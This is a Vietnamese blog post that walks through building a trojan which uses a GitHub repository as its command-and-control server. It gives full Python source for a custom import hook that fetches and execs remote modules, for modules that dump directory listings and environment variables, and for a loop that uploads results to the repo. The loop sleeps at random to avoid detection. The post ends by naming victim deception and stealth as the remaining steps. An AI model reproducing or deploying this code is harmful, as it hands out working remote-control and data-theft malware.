---
author: "waibui"
layout: post
title:  "How To Create Trojan Tool With Github"
date: 2025-03-21
comments: true
description: Cách tạo Trojan tool với Github
categories: introduce
toc: true
tags: 
- security
- python
---

# Giới thiệu
Trojan (hay Trojan Horse – "con ngựa thành Troy") là một loại phần mềm độc hại (malware) giả dạng phần mềm hợp pháp hoặc hữu ích để đánh lừa người dùng tải về và chạy nó. Khi được kích hoạt, Trojan có thể thực hiện nhiều hoạt động độc hại như:

* Đánh cắp thông tin cá nhân (mật khẩu, tài khoản ngân hàng, dữ liệu cá nhân).
* Tạo cửa hậu (backdoor) để tin tặc điều khiển máy tính từ xa.
* Tự động tải xuống và cài đặt phần mềm độc hại khác.
* Chiếm quyền kiểm soát thiết bị để thực hiện tấn công mạng.

---
# Cách Trojan hoạt động
Trojan không tự nhân bản như virus hay sâu máy tính (worm), mà thường lây lan thông qua:

* Email lừa đảo chứa tệp đính kèm độc hại.
* Phần mềm bẻ khóa (crack), keygen, game lậu có chứa mã độc.
* Quảng cáo giả mạo trên web dẫn đến tải phần mềm độc hại.
* USB hoặc thiết bị lưu trữ bên ngoài bị nhiễm Trojan.

---
# Code Trojan with Github
> Constructure
{% highlight bash %}
bhptrojan
├── config
│   └── abc.json
├── data
├── git_trojan.py
├── modules
│   ├── dirlister.py
│   └── environment.py
└── my_token.txt
{% endhighlight %}

## Module
>dirlister.py
{:.filename}
{% highlight python linenos %}
import os

def run(**args):
    print("[*] In dirlister module.")
    files = os.listdir('.')
    return str(files)
{% endhighlight %}

>environment.py
{:.filename}
{% highlight python linenos %}
import os

def run(**args):
    print("[*] In enviroment module.")
    return os.environ
{% endhighlight %}

Ở 2 module này đều có phương thức `run` để tiện cho việc gọi hàm, trả lại dữ liệu sau khi thực thi.
Có thể thêm các module khác tùy ý.

## Config
>abc.json
{:.filename}
{% highlight json %}
[
    {
        "module": "dirlister"
    },
    {
        "module": "environment"
    }
]
{% endhighlight %}

Config chứa tên các module cần chạy.
- Sau khi tạo được modules và config, up lên Github repository. 
- `git_trojan.py` là file chạy chính của trojan, nó sẽ lấy danh sách các module cần chạy từ **config** và import các module từ **modules**.

## Main
>git_trojan.py
{:.filename}
{% highlight python linenos %}
import base64
import github3
import github3.repos
import importlib.util
import json
import random
import sys
import threading
import time
from datetime import datetime
from github3.repos.contents import Contents

def github_connect(token_path='path_to_personal_access_token_file', owner='owner', repo='repo_name') -> github3.repos.Repository:
    """Connects to the GitHub repository."""
    with open(token_path) as f:
        token = f.read().strip()
    return github3.login(token=token).repository(owner, repo)

def get_file_content(dir_name, module_name, repo: github3.repos.Repository) -> bytes:
    """Fetch file content from GitHub repository."""
    file: Contents = repo.file_contents(f"{dir_name}/{module_name}")
    return file.decoded

class GitImporter:
    """Custom module loader to fetch and execute modules from GitHub."""
    def __init__(self, repo):
        self.current_module_code = ""
        self.repo = repo

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        try:
            new_lib = get_file_content('modules', f'{name}.py', self.repo)
            if new_lib:
                self.current_module_code = new_lib.decode('utf-8')  
                return self
        except Exception as e:
            print(f"[!] Error retrieving module {name}: {e}")
        return None

    def load_module(self, name):
        if name in sys.modules:
            return sys.modules[name]

        spec = importlib.util.spec_from_loader(name, loader=None)
        new_module = importlib.util.module_from_spec(spec)

        try:
            exec(self.current_module_code, new_module.__dict__)
        except SyntaxError as e:
            print(f"[!] Syntax error in module {name}: {e}")
            return None 

        sys.modules[name] = new_module
        return new_module

class Trojan:
    """Main Trojan class to manage module execution."""
    def __init__(self, id, repo):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = repo

    def get_config(self):
        """Fetches the configuration file and imports required modules."""
        try:
            config_json = get_file_content('config', self.config_file, self.repo)
            config = json.loads(config_json)

            for task in config:
                if task['module'] not in sys.modules:
                    __import__(task['module']) 

            return config
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            return []

    def module_runner(self, module):
        """Runs a specified module and stores the result."""
        try:
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"[!] Error running module {module}: {e}")

    def store_module_result(self, data):
        """Stores module execution results in the repository."""
        try:
            message = datetime.now().isoformat()
            remote_path = f'data/{self.id}/{message}.data'
            bindata = bytes('%r' % data, 'utf-8')
            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
        except Exception as e:
            print(f"[!] Error storing result: {e}")

    def run(self):
        """Continuously fetches config and runs tasks."""
        while True:
            config = self.get_config()
            for task in config:
                threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                ).start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))

repo = github_connect()

if __name__ == "__main__":
    sys.meta_path.append(GitImporter(repo))
    Trojan('abc', repo).run()
{% endhighlight %}

### Giải thích
> github_connect function
{% highlight bash %}
def github_connect(token_path='path_to_personal_access_token_file', owner='owner', repo='repo_name') -> github3.repos.Repository:
    """Connects to the GitHub repository."""
    with open(token_path) as f:
        token = f.read().strip()
    return github3.login(token=token).repository(owner, repo)
{% endhighlight %}
Hàm này sử dụng `github3` kết nối, xác thực với Github thông qua **Persional Access Token**, trả về  **Repository Object**.
Có thể thay thế `token_path='path_to_personal_access_token_file'` bằng token trực tiếp và bỏ phần đọc file.

> get_file_content function
{% highlight bash %}
def get_file_content(dir_name, module_name, repo: github3.repos.Repository) -> bytes:
    """Fetch file content from GitHub repository."""
    file: Contents = repo.file_contents(f"{dir_name}/{module_name}")
    return file.decoded
{% endhighlight %}
Hàm này đọc nội dung của 1 file thông qua **Repository Object**, trả về dữ liệu dạng bytes.

> GitImporter class
{% highlight bash %}
class GitImporter:
    """Custom module loader to fetch and execute modules from GitHub."""
    def __init__(self, repo):
        self.current_module_code = ""
        self.repo = repo

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve {name}")
        try:
            new_lib = get_file_content('modules', f'{name}.py', self.repo)
            if new_lib:
                self.current_module_code = new_lib.decode('utf-8')  
                return self
        except Exception as e:
            print(f"[!] Error retrieving module {name}: {e}")
        return None

    def load_module(self, name):
        if name in sys.modules:
            return sys.modules[name]

        spec = importlib.util.spec_from_loader(name, loader=None)
        new_module = importlib.util.module_from_spec(spec)

        try:
            exec(self.current_module_code, new_module.__dict__)
        except SyntaxError as e:
            print(f"[!] Syntax error in module {name}: {e}")
            return None 

        sys.modules[name] = new_module
        return new_module
{% endhighlight %}

Khi import 1 module trong **Python**:
1) Python sẽ tìm kiếm module từ thư mục hệ thống hoặc các đường dẫn tùy chỉnh.
2) Nếu không tìm thấy, nó kiểm tra các loader tùy chỉnh trong sys.meta_path.
3) Nếu có loader có phương thức **find_module()**, Python gọi:
{% highlight bash %}
loader = GitImporter().find_module('my_remote_module')
{% endhighlight %}
* `name = "my_remote_module"` được truyền tự động bởi Python. Tức, khi import 1 module mà nó không có sẵn thì `name` là tên của module không có sẵn đó.
* Nếu **find_module()** trả về một đối tượng hợp lệ, Python sẽ gọi tiếp:
{% highlight bash %}
loader.load_module('my_remote_module')
{% endhighlight %}
* `name = "my_remote_module"` lại được truyền vào load_module() tự động.
Nhờ đó, dù không gọi load_module() trực tiếp, Python vẫn truyền vào name đúng.

> Trojan class
{% highlight bash %}
class Trojan:
    """Main Trojan class to manage module execution."""
    def __init__(self, id, repo):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = repo

    def get_config(self):
        """Fetches the configuration file and imports required modules."""
        try:
            config_json = get_file_content('config', self.config_file, self.repo)
            config = json.loads(config_json)

            for task in config:
                if task['module'] not in sys.modules:
                    __import__(task['module']) 

            return config
        except Exception as e:
            print(f"[!] Error loading config: {e}")
            return []

    def module_runner(self, module):
        """Runs a specified module and stores the result."""
        try:
            result = sys.modules[module].run()
            self.store_module_result(result)
        except Exception as e:
            print(f"[!] Error running module {module}: {e}")

    def store_module_result(self, data):
        """Stores module execution results in the repository."""
        try:
            message = datetime.now().isoformat()
            remote_path = f'data/{self.id}/{message}.data'
            bindata = bytes('%r' % data, 'utf-8')
            self.repo.create_file(remote_path, message, base64.b64encode(bindata))
        except Exception as e:
            print(f"[!] Error storing result: {e}")

    def run(self):
        """Continuously fetches config and runs tasks."""
        while True:
            config = self.get_config()
            for task in config:
                threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                ).start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60))
{% endhighlight %}

1) Hàm **get_config** gọi đến **get_file_content** để lấy tên các module cần chạy trên Github Repository.
* Khi lấy được danh sách các module thì nó sẽ import.
{% highlight bash %}
__import__(task['module'])
{% endhighlight %}
* Chính từ dòng này, khi import mà không có module sẵn trên hệ thống cục bộ, Python sẽ tìm nạp module từ **GitImporter** và `name` được truyền từ tên các module này.

2) Hàm **run** sẽ thực hiện vòng lặp vô tận, sẽ ngủ 30' đến 3h để  hạn chế bị hệ thông phát hiện.
* Cứ sau thời gian quy định như vậy, nó sẽ lấy module từ Github Repository và import.
* Sau khi import, nó thực thi các module theo từ `Thread`, cứ cách 1 đến 10 giây sẽ thực hiện module tiếp theo. Hàm được chạy ở đây là `module_runner`
{% highlight bash %}
result = sys.modules[module].run()
{% endhighlight %}
* `module_runner` sẽ chạy các module đã được import thông qua hàm **run()** đã được tạo trong mỗi module.
* Sau khi có result của mỗi module, thực hiện `store_module_result`, up dữ liệu lên Github Repository.

---

Vấn đề còn lại là cách để người dùng mắc bẫy để thực thi và ẩn mình để không bị hệ thống phát hiện.

---
<script src="https://giscus.app/client.js"
        data-repo="waibui/waibui.github.io"
        data-repo-id="R_kgDONiHcVw"
        data-category="Announcements"
        data-category-id="DIC_kwDONiHcV84ClolG"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="preferred_color_scheme"
        data-lang="vi"
        crossorigin="anonymous"
        async>
</script>